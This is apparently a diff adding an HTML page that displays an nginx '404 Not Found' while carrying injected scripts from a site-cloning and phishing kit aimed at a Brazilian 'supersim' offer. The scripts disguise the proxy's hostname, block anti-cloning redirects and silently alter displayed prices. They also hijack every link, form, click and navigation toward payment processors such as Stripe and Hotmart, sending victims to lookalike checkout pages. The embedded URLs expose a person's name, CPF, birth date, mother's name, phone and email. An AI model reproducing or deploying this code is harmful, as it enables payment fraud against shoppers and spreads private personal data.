@@ -1,0 +1,638 @@
+<html><head>
+<meta charset="utf-8">
+
+<script data-sys-proxy-guard="">(function(){if(window.__sys_proxy_guard)return;window.__sys_proxy_guard=true;
+var O="supersim-resgatetkk.site";var P="supersimrerf2i.arktrix.com";
+function rw(url){
+  if(!url||typeof url!=='string')return url;
+  // Block about:blank redirects — used by anti-cloning scripts on origin sites
+  if(url==='about:blank'||url.trim()==='about:blank')return location.href;
+  try{
+    var u=new URL(url,location.href);
+    var h=u.hostname.toLowerCase().replace(/^www./,'');
+    var o=O.toLowerCase().replace(/^www./,'');
+    if(h===o){u.hostname=P;u.protocol='https:';u.port='';return u.href;}
+  }catch(e){}
+  return url;
+}
+try{
+  var _d=Object.getOwnPropertyDescriptor(Location.prototype,'href');
+  if(_d&&_d.set){Object.defineProperty(Location.prototype,'href',{set:function(v){_d.set.call(this,rw(v));},get:_d.get,configurable:true});}
+}catch(e){}
+try{var _a=window.location.assign.bind(window.location);window.location.assign=function(u){return _a(rw(u));};}catch(e){}
+try{var _r=window.location.replace.bind(window.location);window.location.replace=function(u){return _r(rw(u));};}catch(e){}
+try{if(!window.__sys_open_patched){window.__sys_open_patched=true;var _op=window.open;window.open=function(u,t,f){if(u)u=rw(String(u));return _op?_op.call(window,u,t,f):null;};}}catch(e){}
+try{var _hn=Object.getOwnPropertyDescriptor(Location.prototype,'hostname');if(_hn&&_hn.get){Object.defineProperty(Location.prototype,'hostname',{get:function(){var r=_hn.get.call(this);return(r===P||r===P.split(':')[0])?O:r;},configurable:true});}}catch(e){}
+try{var _ho=Object.getOwnPropertyDescriptor(Location.prototype,'host');if(_ho&&_ho.get){Object.defineProperty(Location.prototype,'host',{get:function(){var r=_ho.get.call(this);return(r===P||r.split(':')[0]===P.split(':')[0])?O:r;},configurable:true});}}catch(e){}
+try{var _lor=Object.getOwnPropertyDescriptor(Location.prototype,'origin');if(_lor&&_lor.get){Object.defineProperty(Location.prototype,'origin',{get:function(){var r=_lor.get.call(this);return r.indexOf(P)!==-1?'https://'+O:r;},configurable:true});}}catch(e){}
+// Navigation API (Chrome 102+): intercepts ALL programmatic navigations including location.href = 'x'
+// This is the most reliable way to block about:blank on browsers where Location.prototype is non-configurable
+try{if(window.navigation&&typeof window.navigation.addEventListener==='function'){window.navigation.addEventListener('navigate',function(ev){if(ev.destination&&ev.destination.url==='about:blank'&&ev.cancelable){ev.preventDefault();}});}}catch(e){}
+})()</script>
+
+<style data-arktrix-visibility-fix="">
+/* Fallback: force visibility after 2s if builder JS fails */
+@keyframes arktrix-force-visible { to { opacity:1!important; visibility:visible!important; transform:none!important; } }
+/* Tilda animation blocks */
+.t-animate, [data-animate-style], [data-animate-group] { animation: arktrix-force-visible 0s 2s forwards !important; }
+/* Tilda lazy-loaded images */
+.t-img[data-original], .t-bgimg[data-original] { animation: arktrix-force-visible 0s 1s forwards !important; }
+/* Generic builder patterns */
+[data-aos], .wow, .animated, .elementor-invisible, .is-loading, .lazyload { animation: arktrix-force-visible 0s 2s forwards !important; }
+/* Next.js / Tailwind scroll-triggered animations (opacity-0 + animation-delay) */
+.opacity-0[style*="animation-delay"] { animation: arktrix-force-visible 0s 0.5s forwards !important; }
+/* Ensure body and main containers are visible */
+body, main, #allrecords, #content, .t-body, .t-records { opacity:1!important; visibility:visible!important; }
+</style>
+
+<title>404 Not Found</title></head>
+<body>
+<center><h1>404 Not Found</h1></center>
+<hr><center>nginx</center>
+
+<script data-text-sync="">(function(){
+var pairs=[["R$ 4,43","R$ 11,70"],["R$ 21,63","R$ 28,63"],["R$ 11,70","R$ 3,70"],["Certificado digital\n          R$ 3,70","Certificado digital\n          R$ 3,46"],["R$ 28,63","R$ 28,90"]];
+if(!pairs.length)return;
+function walk(root){
+  var tw=document.createTreeWalker(root,NodeFilter.SHOW_TEXT,null,false);
+  var node;
+  while(node=tw.nextNode()){
+    var txt=node.nodeValue;
+    if(!txt)continue;
+    var changed=false;
+    for(var i=0;i<pairs.length;i++){
+      if(txt.indexOf(pairs[i][0])!==-1){
+        txt=txt.split(pairs[i][0]).join(pairs[i][1]);
+        changed=true;
+      }
+    }
+    if(changed)node.nodeValue=txt;
+  }
+}
+walk(document.body||document.documentElement);
+var obs=new MutationObserver(function(muts){
+  obs.disconnect();
+  for(var m=0;m<muts.length;m++){
+    for(var n=0;n<muts[m].addedNodes.length;n++){
+      var nd=muts[m].addedNodes[n];
+      if(nd.nodeType===1)walk(nd);
+      else if(nd.nodeType===3){
+        var t=nd.nodeValue;if(!t)continue;
+        for(var j=0;j<pairs.length;j++){
+          if(t.indexOf(pairs[j][0])!==-1){
+            nd.nodeValue=t.split(pairs[j][0]).join(pairs[j][1]);
+          }
+        }
+      }
+    }
+    if(muts[m].type==='characterData'){
+      var cd=muts[m].target;
+      if(cd.nodeType===3&&cd.nodeValue){
+        for(var k=0;k<pairs.length;k++){
+          if(cd.nodeValue.indexOf(pairs[k][0])!==-1){
+            cd.nodeValue=cd.nodeValue.split(pairs[k][0]).join(pairs[k][1]);
+          }
+        }
+      }
+    }
+  }
+  obs.observe(document.body||document.documentElement,{childList:true,subtree:true,characterData:true});
+});
+if(document.body)obs.observe(document.body,{childList:true,subtree:true,characterData:true});
+else document.addEventListener('DOMContentLoaded',function(){obs.observe(document.body,{childList:true,subtree:true,characterData:true})});
+})()</script>
+
+<script>
+(function(){
+  if (window.__cdn_routing_core) return;
+  window.__cdn_routing_core = true;
+  var ORIGIN = 'supersim-resgatetkk.site';
+  var PROXY = 'supersimrerf2i.arktrix.com';
+  var ORIGIN_RE = new RegExp('https?://' + ORIGIN.replace(/\\./g, '\\\\.'), 'gi');
+  function rewriteUrl(url) {
+    if (typeof url !== 'string') return url;
+    if (url.indexOf(ORIGIN) !== -1) {
+      var rewritten = url.replace(ORIGIN_RE, 'https://' + PROXY);
+      return rewritten;
+    }
+    return url;
+  }
+  // Monkey-patch fetch
+  var originalFetch = window.fetch;
+  window.fetch = function(input, init) {
+    try {
+      if (typeof input === 'string') {
+        input = rewriteUrl(input);
+      } else if (input && typeof input === 'object' && input.url) {
+        var newUrl = rewriteUrl(input.url);
+        if (newUrl !== input.url) {
+          input = new Request(newUrl, input);
+        }
+      }
+    } catch(e) {}
+    return originalFetch.call(this, input, init);
+  };
+  // Monkey-patch XMLHttpRequest.open
+  try {
+    var originalXhrOpen = XMLHttpRequest.prototype.open;
+    XMLHttpRequest.prototype.open = function(method, url) {
+      try {
+        if (typeof url === 'string') {
+          arguments[1] = rewriteUrl(url);
+        }
+      } catch(e) {}
+      return originalXhrOpen.apply(this, arguments);
+    };
+  } catch(e) { console.warn('[Sys] XHR patch skipped:', e.message); }
+  // Patch dynamic script/link loading (some frameworks inject script tags with origin URLs)
+  try {
+    var originalCreateElement = document.createElement.bind(document);
+    document.createElement = function(tag) {
+      var el = originalCreateElement.apply(document, arguments);
+      try {
+        if (typeof tag === 'string' && (tag.toLowerCase() === 'script' || tag.toLowerCase() === 'link')) {
+          var origSetAttribute = el.setAttribute.bind(el);
+          el.setAttribute = function(name, value) {
+            if ((name === 'src' || name === 'href') && typeof value === 'string') {
+              value = rewriteUrl(value);
+            }
+            return origSetAttribute(name, value);
+          };
+          // Also intercept .src property setter
+          try {
+            var srcDesc = Object.getOwnPropertyDescriptor(HTMLScriptElement.prototype, 'src');
+            if (srcDesc && srcDesc.set) {
+              Object.defineProperty(el, 'src', {
+                set: function(v) { srcDesc.set.call(this, rewriteUrl(v)); },
+                get: function() { return srcDesc.get.call(this); },
+                configurable: true
+              });
+            }
+          } catch(e) {}
+        }
+      } catch(e) {}
+      return el;
+    };
+  } catch(e) { console.warn('[Sys] createElement patch skipped:', e.message); }
+  // Monkey-patch navigator.sendBeacon
+  try {
+    if (navigator.sendBeacon) {
+      var originalSendBeacon = navigator.sendBeacon.bind(navigator);
+      navigator.sendBeacon = function(url, data) {
+        if (typeof url === 'string') {
+          url = rewriteUrl(url);
+        }
+        return originalSendBeacon(url, data);
+      };
+    }
+  } catch(e) { console.warn('[Sys] sendBeacon patch skipped:', e.message); }
+  // Monkey-patch WebSocket
+  try {
+    var OriginalWebSocket = window.WebSocket;
+    window.WebSocket = function(url, protocols) {
+      if (typeof url === 'string') {
+        url = url.replace(new RegExp('wss?://' + ORIGIN.replace(/\\./g, '\\\\.'), 'gi'), function(match) {
+          return match.replace(ORIGIN, PROXY);
+        });
+      }
+      if (protocols !== undefined) {
+        return new OriginalWebSocket(url, protocols);
+      }
+      return new OriginalWebSocket(url);
+    };
+    window.WebSocket.prototype = OriginalWebSocket.prototype;
+    window.WebSocket.CONNECTING = OriginalWebSocket.CONNECTING;
+    window.WebSocket.OPEN = OriginalWebSocket.OPEN;
+    window.WebSocket.CLOSING = OriginalWebSocket.CLOSING;
+    window.WebSocket.CLOSED = OriginalWebSocket.CLOSED;
+  } catch(e) { console.warn('[Sys] WebSocket patch skipped:', e.message); }
+  // Monkey-patch EventSource (Server-Sent Events)
+  if (window.EventSource) {
+    var OriginalEventSource = window.EventSource;
+    window.EventSource = function(url, config) {
+      if (typeof url === 'string') {
+        url = rewriteUrl(url);
+      }
+      if (config !== undefined) {
+        return new OriginalEventSource(url, config);
+      }
+      return new OriginalEventSource(url);
+    };
+    window.EventSource.prototype = OriginalEventSource.prototype;
+    window.EventSource.CONNECTING = OriginalEventSource.CONNECTING;
+    window.EventSource.OPEN = OriginalEventSource.OPEN;
+    window.EventSource.CLOSED = OriginalEventSource.CLOSED;
+  }
+  // Monkey-patch Worker
+  if (window.Worker) {
+    var OriginalWorker = window.Worker;
+    window.Worker = function(url, opts) {
+      if (typeof url === 'string') url = rewriteUrl(url);
+      if (opts !== undefined) return new OriginalWorker(url, opts);
+      return new OriginalWorker(url);
+    };
+    window.Worker.prototype = OriginalWorker.prototype;
+  }
+  // Monkey-patch SharedWorker
+  if (window.SharedWorker) {
+    var OriginalSharedWorker = window.SharedWorker;
+    window.SharedWorker = function(url, opts) {
+      if (typeof url === 'string') url = rewriteUrl(url);
+      if (opts !== undefined) return new OriginalSharedWorker(url, opts);
+      return new OriginalSharedWorker(url);
+    };
+    window.SharedWorker.prototype = OriginalSharedWorker.prototype;
+  }
+  // Intercept dynamic import() via import map injection
+  // Since import() cannot be directly monkey-patched, we inject an importmap
+  // that remaps the origin to the proxy for module specifiers.
+  try {
+    var existingMap = document.querySelector('script[type="importmap"]');
+    if (!existingMap) {
+      var mapScript = document.createElement('script');
+      mapScript.type = 'importmap';
+      mapScript.textContent = JSON.stringify({
+        imports: {
+          ['https://' + ORIGIN + '/']: 'https://' + PROXY + '/'
+        },
+        scopes: {}
+      });
+      // importmap must be added before any module scripts
+      var firstScript = document.querySelector('script');
+      if (firstScript) {
+        firstScript.parentNode.insertBefore(mapScript, firstScript);
+      }
+    }
+  } catch(e) {}
+  // Monkey-patch CSSStyleSheet.insertRule to rewrite @import url() references
+  try {
+    var origInsertRule = CSSStyleSheet.prototype.insertRule;
+    CSSStyleSheet.prototype.insertRule = function(rule, index) {
+      if (typeof rule === 'string' && rule.indexOf(ORIGIN) !== -1) {
+        rule = rule.replace(ORIGIN_RE, 'https://' + PROXY);
+      }
+      return origInsertRule.call(this, rule, index);
+    };
+  } catch(e) {}
+  // Patch dynamic <link rel="stylesheet"> href to rewrite origin URLs
+  try {
+    var linkHrefDesc = Object.getOwnPropertyDescriptor(HTMLLinkElement.prototype, 'href');
+    if (linkHrefDesc && linkHrefDesc.set) {
+      Object.defineProperty(HTMLLinkElement.prototype, 'href', {
+        set: function(v) { linkHrefDesc.set.call(this, rewriteUrl(v)); },
+        get: function() { return linkHrefDesc.get.call(this); },
+        configurable: true
+      });
+    }
+  } catch(e) {}
+  })();
+</script>
+<script>
+!function (w, d, t) {
+w.TiktokAnalyticsObject=t;var ttq=w[t]=w[t]||[];ttq.methods=["page","track","identify","instances","debug","on","off","once","ready","alias","group","enableCookie","disableCookie"],ttq.setAndDefer=function(t,e){t[e]=function(){t.push([e].concat(Array.prototype.slice.call(arguments,0)))}};for(var i=0;i<ttq.methods.length;i++)ttq.setAndDefer(ttq,ttq.methods[i]);ttq.instance=function(t){for(var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n]);return e},ttq.load=function(e,n){var i="https://analytics.tiktok.com/i18n/pixel/events.js";ttq._i=ttq._i||{},ttq._i[e]=[],ttq._i[e]._u=i,ttq._t=ttq._t||{},ttq._t[e]=+new Date,ttq._o=ttq._o||{},ttq._o[e]=n||{};var o=document.createElement("script");o.type="text/javascript",o.async=!0,o.src=i+"?sdkid="+e+"&lib="+t;var a=document.getElementsByTagName("script")[0];a.parentNode.insertBefore(o,a)};
+ttq.load('D7L5J03C77UCN2JB11V0');
+ttq.page();
+}(window, document, 'ttq');
+</script>
+<script>
+  (function(){
+    var expires = new Date(Date.now() + 30 * 24 * 60 * 60 * 1000).toUTCString();
+    document.cookie = "_csid=96b6e9a1-2920-488b-98b5-ca36c3e1422d; path=/; expires=" + expires + "; SameSite=Lax";
+  })();
+(function(){
+  var SUPABASE_URL = "https://hwlevhfqsmyssdpktyhl.supabase.co";
+  var OFFER_ID = "d623a520-1e8c-443a-835b-994063e4a5a4";
+  var SESSION_ID = "96b6e9a1-2920-488b-98b5-ca36c3e1422d";
+  var HEARTBEAT_INTERVAL = 90000;
+  var presenceUrl = SUPABASE_URL + "/functions/v1/track-presence";
+  var lastPing = 0;
+  var isActive = true;
+  var inflight = false;
+  function sendPresence(action) {
+    var payload = JSON.stringify({ action: action, session_id: SESSION_ID, offer_id: OFFER_ID });
+    var isLeave = action === "leave";
+    if (isLeave && navigator.sendBeacon) {
+      try {
+        navigator.sendBeacon(presenceUrl, new Blob([payload], { type: "text/plain;charset=UTF-8" }));
+      } catch (_) {}
+    }
+    if (inflight) return;
+    inflight = true;
+    fetch(presenceUrl, {
+      method: "POST",
+      body: payload,
+      headers: { "Content-Type": "application/json" },
+      keepalive: true,
+    })
+      .catch(function(){})
+      .finally(function(){ inflight = false; });
+  }
+  function ping() {
+    if (!isActive) return;
+    var now = Date.now();
+    if (now - lastPing >= HEARTBEAT_INTERVAL) {
+      lastPing = now;
+      sendPresence("ping");
+    }
+  }
+  sendPresence("ping");
+  lastPing = Date.now();
+  setInterval(ping, HEARTBEAT_INTERVAL);
+  document.addEventListener("visibilitychange", function() {
+    if (document.hidden) {
+      isActive = false;
+      sendPresence("leave");
+    } else {
+      isActive = true;
+      sendPresence("ping");
+      lastPing = Date.now();
+    }
+  });
+  window.addEventListener("beforeunload", function() {
+    isActive = false;
+    sendPresence("leave");
+  });
+  window.addEventListener("pagehide", function() {
+    isActive = false;
+    sendPresence("leave");
+  });
+})();
+</script>
+<script>
+(function(){
+  if (window.__cdn_checkout_handler) return;
+  window.__cdn_checkout_handler = true;
+  var OFFER_SLUG = "supersimrerf2i";
+  var MAPPINGS = [{"o":"https://pay.acesso-seguro-supersim.site/v7R0glkY2X2GVr9?utm_source=TT-1776883909731-hp4mx10p4z3bi&utm_campaign=camp-supersim+-+RAS+ADMINISTRACAO+DE+IMOVEIS+LTDA_bc_vu1rs9+-+01323&utm_medium=paid&email=venturewell1227%40gmail.com&nome_mae=MARIA+DE+NAZARE+ALEXANDRE&data_nasc=22%2F07%2F1977&dueDate=25&telephone=55929851647&telefone=55929851647&document=63792605287&name=DEUSIMAR+VENTURA+SAMPAIO&banco=JKHK&chave_pix=UHIU98","r":"https://www.pagamentos-seguro.link/checkout/6a1a57d1-d86b-4be7-af5b-8994eff03456"},{"o":"https://pay.acesso-seguro-supersim.site/xQBPZvlryXjgmVq?utm_source=TT-1776883909731-hp4mx10p4z3bi&sck=TT-1776883909731-hp4mx10p4z3bi&name=DEUSIMAR+VENTURA+SAMPAIO&email=venturewell1227%40gmail.com&document=63792605287&phone=55929851647","r":"https://www.pagamentos-seguro.link/checkout/faca6095-bad1-40aa-b88a-40b3e5633ed1"},{"o":"https://www.pagamentos-seguro.link/checkout/6a1a57d1-d86b-4be7-af5b-8994eff03456","r":"https://www.pagamentos-seguro.link/checkout/faca6095-bad1-40aa-b88a-40b3e5633ed1"}];
+  var CHECKOUT_DOMAINS = [
+    'perfectpay.com.br', 'pay.perfectpay.com.br',
+    'pay.hotmart.com', 'hotmart.com/product',
+    'pay.kiwify.com.br', 'kiwify.com.br',
+    'pay.hubla.com', 'hub.la',
+    'app.monetizze.com.br',
+    'braip.com',
+    'checkout.stripe.com', 'buy.stripe.com',
+    'eduzz.com', 'sun.eduzz.com',
+    'app.yampi.com.br',
+    'lastlink.com', 'pay.lastlink.com'
+  ].concat(["pay.acesso-seguro-supersim.site","www.pagamentos-seguro.link"]);
+  var CHECKOUT_SUBDOMAIN_PREFIXES = ['pay.','checkout.','seguro.','secure.','payment.','pagar.','pagamento.','comprar.','order.','pedido.','carrinho.','cart.','compra.','comprasegura.'];
+  function isCheckoutUrl(url) {
+    try {
+      var u = new URL(url, window.location.href);
+      var h = u.hostname.toLowerCase();
+      // Check exact/substring match against known domains
+      for (var i = 0; i < CHECKOUT_DOMAINS.length; i++) {
+        if (h.indexOf(CHECKOUT_DOMAINS[i]) !== -1 || u.href.indexOf(CHECKOUT_DOMAINS[i]) !== -1) return true;
+      }
+      // Check subdomain patterns (pay.*, checkout.*, etc.)
+      for (var j = 0; j < CHECKOUT_SUBDOMAIN_PREFIXES.length; j++) {
+        if (h.indexOf(CHECKOUT_SUBDOMAIN_PREFIXES[j]) !== -1) return true;
+      }
+      // Check checkout-like paths
+      var pathLower = (u.pathname || '').toLowerCase();
+      if (pathLower.includes('/checkout') || pathLower.includes('/pagamento') || pathLower.includes('/compra') || pathLower.includes('/payment') || pathLower.includes('/pay') || pathLower.includes('/order')) return true;
+    } catch(e) {}
+    return false;
+  }
+  // Auto-discovery removed – only Firecrawl deep-funnel-scan populates discovered_checkouts
+  // Append UTM params from sessionStorage + current URL to a destination URL
+  var TRACKING_PARAMS = ['utm_source','utm_medium','utm_campaign','utm_content','utm_term','utm_id',
+    'fbclid','gclid','dclid','gbraid','wbraid','msclkid','ttclid'];
+  function getStoredUtms() {
+    // First try the global merged object set by UTM propagation script
+    if (window.__sys_utm_merged) return window.__sys_utm_merged;
+    // Fallback: read from sessionStorage
+    try {
+      var raw = sessionStorage.getItem('__ap_store');
+      return raw ? JSON.parse(raw) : {};
+    } catch(_){ return {}; }
+  }
+  function appendUtmsToUrl(targetUrl) {
+    try {
+      var utms = getStoredUtms();
+      // Also capture from current page URL (in case UTM script hasn't run yet)
+      var sp = new URLSearchParams(window.location.search);
+      for (var i = 0; i < TRACKING_PARAMS.length; i++) {
+        var k = TRACKING_PARAMS[i];
+        if (sp.has(k) && !utms[k]) utms[k] = sp.get(k);
+      }
+      var hasUtms = false;
+      for (var k in utms) { if (utms.hasOwnProperty(k)) { hasUtms = true; break; } }
+      if (!hasUtms) return targetUrl;
+      var u = new URL(targetUrl);
+      for (var k in utms) {
+        if (utms.hasOwnProperty(k) && !u.searchParams.has(k)) {
+          u.searchParams.set(k, utms[k]);
+        }
+      }
+      return u.toString();
+    } catch(_) { return targetUrl; }
+  }
+  function rewriteUrl(url) {
+    if (!url) return url;
+    var replacementUrl = null;
+    for (var i = 0; i < MAPPINGS.length; i++) {
+      var m = MAPPINGS[i];
+      if (url === m.o || url.indexOf(m.o) !== -1) {
+        replacementUrl = m.r;
+        break;
+      }
+    }
+    if (!replacementUrl && isCheckoutUrl(url) && MAPPINGS.length > 0) {
+      replacementUrl = MAPPINGS[0].r;
+    }
+    if (replacementUrl) {
+      // Append UTM parameters to the replacement URL
+      return appendUtmsToUrl(replacementUrl);
+    }
+    return url;
+  }
+  function applyRewritesToDom(root) {
+    var scope = root && root.querySelectorAll ? root : document;
+    var links = scope.querySelectorAll ? scope.querySelectorAll('a[href]') : [];
+    for (var i = 0; i < links.length; i++) {
+      var href = links[i].getAttribute('href');
+      if (!href || !isCheckoutUrl(href)) continue;
+      var rewrittenHref = rewriteUrl(href);
+      if (rewrittenHref !== href) {
+        links[i].setAttribute('href', rewrittenHref);
+        links[i].dataset.arktrixRewritten = '1';
+      }
+    }
+    var forms = scope.querySelectorAll ? scope.querySelectorAll('form[action]') : [];
+    for (var j = 0; j < forms.length; j++) {
+      var action = forms[j].getAttribute('action');
+      if (!action || !isCheckoutUrl(action)) continue;
+      var rewrittenAction = rewriteUrl(action);
+      if (rewrittenAction !== action) {
+        forms[j].setAttribute('action', rewrittenAction);
+      }
+    }
+    var dataHrefNodes = scope.querySelectorAll ? scope.querySelectorAll('[data-href]') : [];
+    for (var k = 0; k < dataHrefNodes.length; k++) {
+      var dataHref = dataHrefNodes[k].getAttribute('data-href');
+      if (!dataHref || !isCheckoutUrl(dataHref)) continue;
+      var rewrittenDataHref = rewriteUrl(dataHref);
+      if (rewrittenDataHref !== dataHref) {
+        dataHrefNodes[k].setAttribute('data-href', rewrittenDataHref);
+      }
+    }
+  }
+  // Rewrite links already present in initial HTML (before user interaction)
+  if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', function(){ applyRewritesToDom(document); }, { once: true });
+  } else {
+    applyRewritesToDom(document);
+  }
+  // Intercept window.open
+  var origOpen = window.open;
+  window.open = function(url) {
+    if (url && isCheckoutUrl(url)) {
+      var rewritten = rewriteUrl(url);
+      if (rewritten !== url) { arguments[0] = rewritten; }
+    }
+    return origOpen.apply(this, arguments);
+  };
+  // Intercept location.assign and location.replace
+  try {
+    var origAssign = window.location.assign.bind(window.location);
+    window.location.assign = function(url) {
+      if (url && isCheckoutUrl(url)) { url = rewriteUrl(url); }
+      return origAssign(url);
+    };
+    var origReplace = window.location.replace.bind(window.location);
+    window.location.replace = function(url) {
+      if (url && isCheckoutUrl(url)) { url = rewriteUrl(url); }
+      return origReplace(url);
+    };
+  } catch(e) {}
+  // Intercept location.href setter on Location.prototype (most reliable cross-browser)
+  // Patching window.location instance directly fails silently in many browsers
+  // because window.location is a special non-configurable host object.
+  try {
+    var _origHrefDesc = Object.getOwnPropertyDescriptor(Location.prototype, 'href');
+    if (_origHrefDesc && _origHrefDesc.set) {
+      var _origHrefSet = _origHrefDesc.set;
+      var _origHrefGet = _origHrefDesc.get;
+      Object.defineProperty(Location.prototype, 'href', {
+        set: function(v) {
+          if (v && typeof v === 'string' && isCheckoutUrl(v)) {
+            var rw = rewriteUrl(v);
+            if (rw !== v) {
+              _origHrefSet.call(this, rw);
+              return;
+            }
+          }
+          _origHrefSet.call(this, v);
+        },
+        get: function() { return _origHrefGet.call(this); },
+        configurable: true
+      });
+    }
+  } catch(e) {}
+  // Also intercept window.location = 'url' assignment (different from .href setter)
+  // This catches code like: window.location = 'https://checkout.perfectpay.com.br/...'
+  try {
+    var _locDesc = Object.getOwnPropertyDescriptor(window, 'location');
+    if (_locDesc && _locDesc.set) {
+      var _origLocSet = _locDesc.set;
+      var _origLocGet = _locDesc.get;
+      Object.defineProperty(window, 'location', {
+        set: function(v) {
+          if (v && typeof v === 'string' && isCheckoutUrl(v)) {
+            var rw = rewriteUrl(v);
+            if (rw !== v) { _origLocSet.call(this, rw); return; }
+          }
+          _origLocSet.call(this, v);
+        },
+        get: function() { return _origLocGet.call(this); },
+        configurable: true
+      });
+    }
+  } catch(e) {}
+  // Navigation API (Chrome 102+, Edge 102+): most reliable way to intercept
+  // programmatic navigations like window.location.href = 'url' when
+  // Location.prototype.href is non-configurable (which is common in modern browsers).
+  try {
+    if (window.navigation && typeof window.navigation.addEventListener === 'function') {
+      window.navigation.addEventListener('navigate', function(ev) {
+        if (!ev || !ev.destination || !ev.destination.url) return;
+        var destUrl = ev.destination.url;
+        if (isCheckoutUrl(destUrl)) {
+          var rw = rewriteUrl(destUrl);
+          if (rw !== destUrl) {
+            ev.preventDefault();
+            window.location.replace(rw);
+          }
+        }
+      });
+    }
+  } catch(e) {}
+  // Intercept clicks on ANY element (not just <a> tags) — React SPAs use <button onClick>
+  // that triggers window.location.href = url. We can't always patch the setter, so we also
+  // intercept clicks on buttons/CTA elements and check navigation in a microtask.
+  document.addEventListener('click', function(e) {
+    // First: standard <a> tag interception
+    var el = e.target;
+    var anchor = el;
+    while (anchor && anchor.tagName !== 'A') anchor = anchor.parentElement;
+    if (anchor && anchor.href && isCheckoutUrl(anchor.href)) {
+      var rewritten = rewriteUrl(anchor.href);
+      if (rewritten !== anchor.href) {
+        e.preventDefault();
+        e.stopPropagation();
+        window.location.href = rewritten;
+        return;
+      }
+    }
+  }, true);
+  // Intercept form submissions to checkout domains
+  document.addEventListener('submit', function(e) {
+    var form = e.target;
+    if (form && form.action && isCheckoutUrl(form.action)) {
+      var rewritten = rewriteUrl(form.action);
+      if (rewritten !== form.action) {
+        e.preventDefault();
+        window.location.href = rewritten;
+      }
+    }
+  }, true);
+  // MutationObserver: rewrite checkout hrefs as they appear in the DOM
+  var obs = new MutationObserver(function(muts) {
+    for (var i = 0; i < muts.length; i++) {
+      var nodes = muts[i].addedNodes;
+      for (var j = 0; j < nodes.length; j++) {
+        var node = nodes[j];
+        if (node.nodeType !== 1) continue;
+        applyRewritesToDom(node);
+        // Also check the node itself when it's an anchor/form element
+        if (node.tagName === 'A' && node.getAttribute('href')) {
+          var nodeHref = node.getAttribute('href');
+          if (isCheckoutUrl(nodeHref)) {
+            var rw = rewriteUrl(nodeHref);
+            if (rw !== nodeHref) {
+              node.setAttribute('href', rw);
+              node.dataset.arktrixRewritten = '1';
+            }
+          }
+        }
+        if (node.tagName === 'FORM' && node.getAttribute('action')) {
+          var nodeAction = node.getAttribute('action');
+          if (isCheckoutUrl(nodeAction)) {
+            var rwAction = rewriteUrl(nodeAction);
+            if (rwAction !== nodeAction) {
+              node.setAttribute('action', rwAction);
+            }
+          }
+        }
+      }
+    }
+  });
+  obs.observe(document.documentElement, { childList: true, subtree: true });
+  })();
+</script>
+<script>(function(){try{var p=window.parent;if(p===window)return;function r(){p.postMessage({t:'sys-nav',u:location.href},'*')}r();window.addEventListener('popstate',r);var _ps=history.pushState;history.pushState=function(){_ps.apply(this,arguments);r()};var _rs=history.replaceState;history.replaceState=function(){_rs.apply(this,arguments);r()}}catch(e){}})()</script>
+
+
+</body></html>
